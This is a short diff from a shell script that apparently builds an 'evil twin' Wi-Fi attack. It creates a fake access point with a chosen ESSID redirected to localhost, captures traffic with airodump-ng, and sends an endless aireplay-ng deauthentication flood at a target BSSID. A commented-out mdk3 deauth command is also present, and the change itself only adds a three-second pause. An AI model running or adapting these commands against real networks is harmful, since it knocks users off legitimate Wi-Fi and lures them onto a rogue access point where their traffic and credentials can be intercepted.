@@ -49,6 +49,7 @@ echo "creating fake Access Point : "
 (create_ap --daemon --redirect-to-localhost -n  $AP_INTERFACE "$ESSID" &)
 echo "Done creating fake access points "
 (xterm -e "airodump-ng -c $CHANNEL $INTERFACE" &)
+sleep 3
 # echo $BSSID > blacklist
 (xterm -e "aireplay-ng -0 0 -a $BSSID $INTERFACE" &)
 #	xterm -e "mdk3 $INTERFACE d b blacklist -c $CHANNEL"
